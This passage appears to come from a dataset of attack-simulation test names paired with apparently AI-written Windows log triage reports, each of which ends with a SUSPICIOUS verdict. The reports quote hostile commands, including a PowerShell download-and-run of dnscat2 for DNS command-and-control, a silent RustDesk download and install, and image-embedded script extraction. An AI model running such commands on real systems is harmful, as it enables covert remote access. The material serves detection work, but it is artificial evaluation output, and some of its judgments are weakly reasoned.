1. **Frequent Execution of `wevtutil` and `conhost` processes:**
   - Multiple instances where `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` are executed under the user `SERVER002\admin_test`. `wevtutil.exe` is a legitimate command-line utility used for managing Windows event logs which, without further context, is not inherently malicious. However, its frequent execution in quick succession could indicate log manipulation or clearing activity. The execution of `conhost.exe` frequently with `wevtutil.exe` suggests these processes may be interacting.
   
2. **Execution of PowerShell to Run an Unfamiliar Executable:**
   - The logs show a command being executed via PowerShell to run an executable `data_NetSupport.exe` from a Temp directory. This behavior is suspicious as it involves executing applications from temporary directories, which is common in malicious activities.
   - The executable `NetSupport Manager` is legitimate remote control software, but its execution context here (from temp paths) is unusual and could potentially indicate unauthorized remote access attempts.

3. **Failed Installation of `NetSupport Manager`:**
   - The logs mention that the installation operation for `NetSupport Manager` failed. This could suggest either an intentional failure to install by a legitimate user due to perhaps permissions or compatibility issues or could be an interrupted unauthorized attempt.

4. **Signs of Edge Update Activity:**
   - Extensive system activity related to Microsoft Edge update processes. While these update-related entries can be typical in a legitimate context, they involve numerous executions and logs around the same time as the suspected unwanted activity, raising questions about potential misdirection or misuse.

5. **Presence of High Integrity Level for Multiple Processes:**
   - The `IntegrityLevel` for several executables like `HOSTNAME.EXE`, `whoami.exe`, and processes associated with PowerShell scripts and installations were high. This can indicate that these tasks are running with elevated privileges, increasing potential risks if these are unauthorized or malicious.

**Assessment:** The activity within the logs suggests SUSPICIOUS behavior primarily due to:
- Unusual execution of system utilities such as `wevtutil` alongside common shell utility `conhost`.
- Execution of `data_NetSupport.exe` from a temporary directory using PowerShell, which raises concerns of potential unauthorized remote control actions.
- Although there are legitimate aspects (e.g., Edge patches, system commands), the execution contexts raise flags due to the potentially altered or undesired usage patterns.

**Recommendation for Next Steps:**
1. **Immediate Investigation:** Conduct a deeper forensic investigation of the host to determine the reason for the `wevtutil` executions and validate the legitimacy of `data_NetSupport.exe`.
2. **Access Log Analysis:** Verify the circumstances under which the suspicious PowerShell command was run, including user access logs to identify any unauthorized access.
3. **Network Traffic Monitoring:** Monitor for any anomalous network traffic originating from the host that could indicate remote sessions or data exfiltration.
4. **File Integrity Checks:** Perform file integrity checks on critical system files and configurations to detect any unauthorized modifications.

**Resolution:** Based on the current evidence:
- **Resolution:** SUSPICIOUS - The logs suggest activities that require further exploration to ensure no security breach or compromise is ongoing."
RustDesk Files Detected Test on Windows,"After analyzing the provided Windows event logs, I've identified several noteworthy activities:

1. **Unusual PowerShell Usage**: There are several PowerShell events where the script is downloading and executing an executable from the internet (RustDesk - ""Invoke-WebRequest -OutFile $file https://github.com/rustdesk/rustdesk/releases/download/1.2.3-1/rustdesk-1.2.3-1-x86_64.exe""). This is suggestive of potentially suspicious behavior as PowerShell is a known tool often used in attacks for downloading and executing malicious files.

2. **RustDesk Execution**: RustDesk is a remote desktop software, and its unprompted or unauthorized installation could indicate unauthorized remote access or preparations for it. The execution of ""rustdesk-1.2.3-1-x86_64.exe"" with silent install switches could suggest this was done without user consent.

3. **Process Termination**: There is evidence of ""taskkill.exe"" being used to terminate processes related to RustDesk (e.g., ""taskkill /F /IM RuntimeBroker_rustdesk.exe""). This obscures what might be legitimate usage or further suspicious behavior.

4. **Multiple Incidents of Elevated Privileges**: The logs show a recurring pattern of privilege usage, especially the `SeDebugPrivilege` and other sensitive privileges being assigned (EventID 4672), which is commonly associated with activities requiring elevated permissions and could be leveraged by attackers post-compromise for lateral movement.

5. **Credential and User Account Activity**: EventID 4798 shows user enumeration operations, notably involving accounts like ""Administrator"" and ""admin_test,"" which could be part of reconnaissance activities by an attacker to understand user accounts on the system.

Given these observations, the presence of PowerShell scripts downloading and executing a remote access tool, combined with process terminations and elevated privilege usage, suggest potentially suspicious activity. This does not conclusively indicate malicious intent as some events could be part of legitimate administrative actions, but the pattern and tools involved are consistent with techniques observed in certain attack scenarios.

**Resolution: SUSPICIOUS**

**Guidance on how to proceed:**
- Conduct a more comprehensive investigation into who initiated the PowerShell script and the context of its execution.
- Monitor for further unusual activity involving RustDesk or PowerShell, especially relating to remote sessions and downloads.
- Evaluate whether the accounts ""admin_test"" and others listed are being used appropriately, checking for signs of account compromise.
- Consider isolating the host for further forensic analysis to ensure that any compromise is contained and assess the full impact.
- Update and review security policies related to PowerShell usage and software installation to prevent unauthorized actions."
Embedded Script in Image Execution via Extract-Invoke-PSImage,"After analyzing the provided logs, several indicators of suspicious behavior stand out which could imply potential malicious activity:

1. **PowerShell Activity:**
   - The PowerShell log entries indicate the use of `Extract-Invoke-PSImage.ps1` on an image file `evil_kitten.jpg` to extract and execute potentially encoded scripts.
   - This technique resembles steganography, where data is concealed within an image, a common tactic among attackers to obscure malicious scripts in seemingly benign files.
   - The extracted script content undergoes a base64 decoding process, indicating the presence of obfuscated or encoded data, which is another red flag often seen in cyber-attacks.

2. **Execution of Wevtutil and Conhost:**
   - Multiple executions of `wevtutil.exe` and `conhost.exe` are recorded.
   - The use of `wevtutil.exe` can be an indicator of log tampering, a method used by attackers to cover their tracks by exporting or clearing Windows event logs.
   - Repeated and seemingly purposeless invocation of console host processes (`conhost.exe`) is unusual and could relate to attempts to initiate or handle console-based operations required by the hidden processes.

3. **Sysmon Events:**
   - The Sysmon log shows several processes spawned under `admin_test` user privileges, including PowerShell and command-line utilities (`HOSTNAME.EXE`, `whoami.exe`), suggesting elevated privileges were utilized.
   - The specific combination and sequence of the executed commands might relate to reconnaissance and information gathering within the system.

4. **Use of System Utilities:**
   - The use of `whoami.exe` and `hostname.exe` can often be associated with attackers attempting to map the environment and understand the context of the compromised system, such as user permissions and machine identity.

Given the above observations, the activity recorded in the logs is indicative of suspicious and potentially malicious actions, particularly due to the use of a known attack technique using PowerShell and image-based script extraction, along with potential log manipulation activities.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- Conduct further detailed analysis on the involved PowerShell scripts (`Extract-Invoke-PSImage.ps1`) and any resulting decoded scripts to determine their intention and functionality.
- Investigate system integrity by verifying recent modifications, especially around the time of these events.
- Check for any unauthorized user accounts or privilege escalation within the system.
- Review Windows Event logs for any signs of artifacts being altered or deleted.
- Perform a thorough system scan using an updated antivirus or endpoint detection tool to identify any known malicious signatures.
- Monitor network traffic for any unusual outbound communications, which might indicate data exfiltration.
- Consider isolating the system if these activities are determined to pose an ongoing threat, and prepare for a potential incident response."
Download a file using wscript,"The collection of logs provided contains some events that appear to be benign activities typically associated with the Microsoft Edge browser's automatic updates processes. However, there are a few areas worth noting or investigating further for potential risks:

1. **Microsoft Edge Update Activity**: The log entries show multiple instances of Microsoft Edge Update processes running with high integrity level as `NT AUTHORITY\SYSTEM`, a typical behavior during automatic updates. The sequence of Microsoft Edge Update processes (e.g., `MicrosoftEdgeUpdate.exe`, `setup.exe`) and their paths are standard for a legitimate update process. The SHA256 hashes provided for the executables should be verified against known good hashes to ensure they are not tampered with.

2. **PowerShell Execution**: There is a PowerShell process executed by the user `SERVER002\admin_test`:
    - PowerShell is a powerful tool often used by attackers for malicious activities such as script execution or further privilege escalation.
    - There is no explicit command-line argument provided in the logs, which makes it difficult to determine if it was malicious. Without more context, this event should be noted as potentially suspicious.

3. **CMD and WSCRIPT Execution**: 
    - The execution of `cmd.exe` with a script (`wscript.exe`) call to a VBS script (`data-download-file.vbs`) is observed. This might indicate a script execution to download data or execute commands which could be benign if part of administrative scripts but suspicious if unauthorized or unexpected.
    - The parent and current directories used in these instances are temporary locations, which are commonly abused by malware.

4. **Frequent Use of `wevtutil.exe` and `conhost.exe`**:
    - The frequent invocation of `wevtutil.exe` (a utility for managing and querying event logs) and its associated `conhost.exe` processes by `SERVER002\admin_test` could imply log management or review activities. These should be cross-referenced with business operations to determine legitimacy.

5. **No Parental Process or Image Information**:
    - Some of the Edge Update processes lack a parent process or image information, which can be an artifact of a system process or indicative of tampering if unexpected.

**Assessment**: 
- **SUSPICIOUS** - The prevailing activities primarily highlight routine Edge update processes. However, the presence of PowerShell running without clear context, VBS script execution, and the frequent use of `wevtutil.exe` with unknown intents raise concerns that warrant additional investigation to ensure credentials have not been compromised or used improperly. A thorough review of user `admin_test` activities, comparison of executable hashes with trusted sources, and ensuring all update paths are valid, would be advisable.

**Guidance**:
1. Verify the SHA256 hashes of significant executables against known good values to confirm their integrity.
2. Investigate the source and purpose of the VBS script `data-download-file.vbs` and ensure it is part of expected operations.
3. Review the necessity and context of the executed PowerShell and `wevtutil.exe` commands to rule out misuse.
4. Consider monitoring the `SERVER002\admin_test` user for unusual activities outside typical working patterns."
Malicious User Agents - CMD,"Upon analyzing the given Sysmon logs, several observations can be made:

1. **Microsoft Edge Update Activity**: 
   - There are multiple entries showing the execution of `MicrosoftEdgeUpdate.exe` and its related components. These activities align with the expected behavior of automatic updates for Microsoft Edge and do not raise immediate red flags.
   
2. **Use of PowerShell**:
   - There is an execution of `powershell.exe` by the user `SERVER002\admin_test`. PowerShell can be used for legitimate administrative tasks, but it's also commonly used in attacks. However, without further context or a suspicious command-line argument, this single entry is not inherently malicious.

3. **Multiple `wevtutil.exe` Executions**:
   - `wevtutil.exe` is used for event log management. Multiple executions by `admin_test` might suggest someone is querying or clearing logs, which can be a tactic used post-compromise. This behavior can be suspicious if not aligned with normal administrative duties.

4. **Execution of Network Probing Commands**:
   - There are command lines initiated through `cmd.exe` that involve `curl.exe` used to query various user agents towards `www.google.com`. The use of various user agents can sometimes indicate reconnaissance efforts or testing network access, which is suspicious.

5. **Environment Context**:
   - All activities were performed under the `SERVER002\admin_test` account, and the pattern and rapid succession of these executions suggest scripted or automated tasks.
   
Based on the evaluation, the recurring and automated-like activity involving `wevtutil.exe` and varied user agents with `curl` in a relatively short period raise concerns and may require further investigation. These actions could potentially involve unauthorized reconnaissance, which necessitates a deeper examination into who initiated these commands and why.

**Final Resolution**: **SUSPICIOUS**

**Recommendations**:
- Conduct a full audit of the `admin_test` account usage and verify any scheduled tasks or scripts that could explain the observed behavior.
- Check for any related logs that might provide additional context such as command-line arguments for the PowerShell invocation.
- Review relevant security patches and configurations to ensure they're up-to-date, particularly for auditing and process creation.
- If feasible, engage the user associated with the account to confirm whether these activities were sanctioned and understood by them."
Windows - PowerShell Download,"In analyzing the logs provided, let's identify any suspicious activities or anomalies:

1. **PowerShell Activity:**
   - The PowerShell logs show a command executed to download a file from an external URL (`https://raw.githubusercontent.com/file/file-file/master/LICENSE.txt`) to the temporary directory on the system. While this is a legitimate URL seemingly pointing to a file hosted on GitHub, the action itself is suspicious in the context of server operations, especially if this action is not part of automated and known processes for software development or deployment.

2. **Process Creation and Execution:**
   - The Sysmon log entries detail a series of processes linked to Microsoft Edge Update operations. While these update processes are legitimate activities generally associated with software maintenance, their frequency and the involvement of temporary and varied directories (e.g., `Microsoft\\Temp\\EU6F2B.tmp`) may necessitate extra scrutiny to rule out tampering or unauthorized software deployment practices. 
   - The presence of PowerShell execution in conjunction with an HTTPS download could be indicative of a potential attempt to execute scripts or download additional payloads, often a technique used in malware attacks.
   - Multiple executions of system utilities such as `wevtutil.exe` and `conhost.exe` by the user `admin_test` suggests administrative activity on the server, which might be typical, but requires confirmation that it's authorized.

3. **Edge Update Processes:**
   - There is significant activity related to Microsoft Edge Update, which in a normal software maintenance context may not be unusual. However, given the PowerShell download activity, it is crucial to verify that the Edge update processes conform to expected and authorized software management practices.

4. **User Activity:**
   - The logs indicate actions executed under `SERVER002\\admin_test`, including system utilities and PowerShell instances. This requires verification to ensure that the user actions are authorized, and it would be beneficial to consult user access logs and validate schedule tasks or policies in place for administrative actions.

**Assessment and Resolution:**

- **Suspicious Behavior:**
  - The fact that PowerShell is used for downloading content from the web could indicate a risk, especially if not part of a sanctioned administrative process.
  - The user `admin_test` appears frequently in process execution logs. It is important to ensure that this user's processes are legitimate and correspond to known administrative actions.

**Recommendations:**

1. Verify the legitimacy of the PowerShell web request, ensuring that downloading from external URLs is a known and necessary procedure.
2. Review user account activities for `admin_test` to affirm that the activities match expected patterns and check whether these are scheduled tasks or manual interventions.
3. Contact system or software management teams to confirm the Edge update processes, ensuring they align with standard procedures and there is no associated unauthorized software installation.
4. If possible, inspect file hashes associated with Executable files, ensure they match known good hashes for Microsoft applications.

**Resolution:**
- **SUSPICIOUS** - Some activities are potentially normal in certain controlled environments, but the combination of PowerShell download commands and overlapping admin activities without clear context or authentication demands further investigation."

DNS C2,"Upon reviewing the provided event logs, several events suggest potentially malicious activities that warrant further investigation. Below is a detailed analysis of the findings:

### 1. Time Manipulation
- **Security Log (EventID 4616)**: There are two instances where the system time was set back, as highlighted by events where `NewTime` is earlier than `PreviousTime`. Such activity can be suspicious, as it may be an attempt to evade detection or alter log timelines.

### 2. Suspicious PowerShell Activity
- **PowerShell Log**: The logs indicate a PowerShell script was executed with the following command: `(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/.../dnscat2.ps1')` followed by `Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1`. This is a known means to download and execute a potentially malicious script (Dnscat2 being used for covert communication).

### 3. Unknown Credential Access Attempts
- **Security Log (EventID 5379)**: Multiple events indicate unsuccessful attempts to read credentials from `MicrosoftAccount:user=02txoixylodcstop` and `WindowsLive:(token/cert)` which could be probing for sensitive information.

### 4. Process Execution of Interest
- **Sysmon Log**: The execution of `MicrosoftEdgeUpdate.exe` with various command lines and from temporary directories (`C:\Program Files (x86)\Microsoft\Temp\`) may be legitimate software updates or could potentially be abused by malicious actors for persistence or privilege escalation.

### 5. Unrequired Services and Processes
- **Sysmon Log (among others)**: Processes like `CompatTelRunner.exe`, `MusNotification.exe`, and `UsoClient.exe` are being executed. While these are typically benign system processes related to telemetry and system updates, they could be leveraged in living-off-the-land attacks (using legitimate software for malicious purposes).

### Resolution
Given the presence of suspicious PowerShell activities and time manipulation, along with unexplained credential access and use of system utilities, this analysis concludes the activities are **SUSPICIOUS**. 

### Next Steps
- **Isolate the host** from the network to prevent any potential lateral movement.
- **Inspect** the network traffic logs during the timestamps of suspicious activities for unauthorized data exfiltration or communication with known malicious domains.
- **Perform a detailed forensic analysis** of the system, focusing on PowerShell scripts and downloaded objects, along with verifying the integrity and legitimacy of running binaries and scripts.
- **Alert and inform the incident response team** to take appropriate mitigation measures and further investigate the full scope of the potential compromise."
Telnet C2,"Based on the analysis of the provided log data, I've identified notable entries and suspicious activities:

1. **PowerShell Execution**:
    - A PowerShell instance is running a script from the location `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\telnet_client.exe` with the command-line invocation for `telnet_client.exe 127.0.0.1 --port 23`. This is peculiar because:
      - It is being executed from a temporary directory, which is atypical for legitimate applications and often indicative of malicious or test activities.
      - The use of `telnet`, a protocol typically not used due to its unsecured nature, raises a red flag for potential malicious activity or unauthorized network testing.

2. **Sysmon Events**:
    - The process `powershell.exe` initiated the execution of `telnet_client.exe` in a temporary path which aligns with the suspicious PowerShell execution.
    - A sequence of Microsoft Edge Update processes indicates patching or updating activity. However, the presence of temporary directories under `MicrosoftEdgeUpdate` for execution is unusual for legitimate operations, which typically happen directly from the install path.
    - There's an absence of additional context or known indicators of compromise in the several Edge Update executions themselves. While they appear normal based on the hash values, execution from temporary folders is uncommon for updates.

3. **Other Observations**:
    - No unusual log entries in the System, Security, or Application logs besides benign service stops and starts. The Edge Update logging appears routine, though worth observing for the directory concerns as stated.

Given these insights, the use of Telnet, the execution path of the script, and the combination of temporary directories for task processing necessitate further investigation. Specifically:

- **Verify the script and the temporary directory's origin and intent**. Determine if the job is automated, for testing, or if it has a direct business application.
- **Assess for any unauthorized use of Telnet or other unsecured protocols** on the network. It may involve a review of network monitoring logs to track suspicious outbound/inbound connections.

Based on the findings:

**Resolution: SUSPICIOUS**

Further investigation should be conducted to determine if this activity is genuinely illicit or if it was a benign operational task or incorrectly flagged anomaly."
Malicious User Agents - Powershell,"Upon reviewing the provided event logs, here's a detailed analysis of the activity logged:

1. **Security Log (Event ID 4799):**
   - The event logs a process execution, specifically `Microsoft Edge Installer` (`setup.exe`) within a temporary directory associated with Edge updates. The execution is performed by `NT AUTHORITY\SYSTEM`, which is standard for system-level tasks. This behavior is typical during software updates for applications like Microsoft Edge and does not inherently suggest malicious activity.

2. **Windows PowerShell Log (Event ID 600):**
   - There are several `Invoke-WebRequest` commands targeting `www.google.com` with various User-Agent strings. While these requests might appear odd due to unusual User-Agent strings like `""*<|>*""`, there is no further context indicating they were part of malicious commands. This behavior is somewhat suspicious as it indicates unconventional activity that might warrant deeper analysis, such as checking for misconfigurations or unauthorized script executions.

3. **Application Log (Event ID 16384):**
   - The `Software Protection Platform Service` activity does not indicate any abnormal behavior. This is typically tied to the validation of software licenses and shows routine log entries.

4. **System Log (Event ID 35):**
   - The `Time Service` event logs a time source synchronization, which is normal routine behavior and not indicative of malicious activity.

5. **Sysmon Log:**
   - **Process Creation and Execution:**
     - `HOSTNAME.EXE`, `wevtutil.exe`, and `conhost.exe` executions are logged by a user `SERVER002\admin_test`. These tools are legitimate and part of system administration tasks but can be used maliciously. However, when tied with the rest of the events, they don't indicate immediate malicious activity.
   - **Edge Installer Activity:**
     - Multiple entries for the execution of `Microsoft Edge Installer` that coincide with Edge update installations indicate a legitimate software update process. The multiple instances of `setup.exe` with detailed command lines point strongly towards a genuine update process rather than malicious behavior.

**Assessment:**
- Based on the provided logs, the activity of Microsoft Edge updates appears legitimate, reinforced by associated command lines and known file paths.
- The PowerShell activity requires further scrutiny due to unconventional User-Agent strings, although no direct evidence suggests malicious activity.

**Resolution:**
- **SUSPICIOUS**: The logs exhibit activity that is largely consistent with legitimate system and software update processes. However, the unusual PowerShell behavior merits further investigation to affirm it is not part of unauthorized activities or misconfigurations. Further examination of user activity logs, system configurations, and potentially performing a more in-depth forensic analysis might be prudent to rule out any hidden compromise.
  
**Guidance:**
- Investigate the context of the PowerShell commands. Consider reviewing recent changes, user activity logs, and any corresponding network traffic that could confirm or explain the Invoke-WebRequest activity.
- Verify with system administrators if these activities align with scheduled updates or administrative tasks, especially to ensure there is no unsanctioned automation or scripting occurring outside usual processes."
File Download via PowerShell,"Upon review of the provided Windows event logs, several entries stand out that may indicate suspicious activity and warrant further investigation:

1. **Windows PowerShell Log**:
   - There is evidence of PowerShell being used to download a file from the internet: `powershell.exe & {(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/file/file-file/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt}`. 
   - The use of PowerShell to download and execute a file is a common technique used in malware attacks to lateral move or download additional malicious content.

2. **Sysmon Log**:
   - Multiple executions of `whoami.exe`, `hostname.exe`, and `conhost.exe` are noted, which are not inherently malicious, but combined with the PowerShell activity, it could indicate reconnaissance activities or attempts to gather more information about the system and network.
   - The `wevtutil.exe` process is executed multiple times, possibly indicating that Windows Event Logs are being cleared or queried, which could be an attempt to cover tracks by a malicious actor.

3. **Security Log: Time Change Events**:
   - There are multiple entries of Event ID 4616 related to Windows time being changed (`PreviousTime` and `NewTime`). While time changes can have legitimate reasons, in coordination with other suspicious activities, it might indicate an attempt at anti-forensic activities to evade detection based on log timestamps.

**Assessment**:
The combined activities, especially the use of PowerShell to download and run a script from an external source, suggest potential malicious intent and compromise, particularly if such activity was not authorized or expected as part of normal operations. Moreover, multiple executions of `wevtutil.exe`, in conjunction with time changes and system utility executions, could signify efforts to obfuscate further actions on the device.

**Resolution**: **SUSPICIOUS**

**Guidance on How to Proceed**:
- Conduct a deeper forensic analysis on the host system to verify the integrity and the origin of the activities. 
- Verify whether the download and execution of content via PowerShell was sanctioned or expected by the user of `SERVER002`.
- If unauthorized, isolate the system from the network to prevent further potential malicious activities.
- Check for any additional indicators of compromise, including unexpected network connections, other script executions, and system modifications.
- Consider performing a full malware scan and reviewing user account activities for any anomalies.
- If malicious activity is confirmed, proceed with incident response processes and potentially resetting account credentials and cleaning the system."
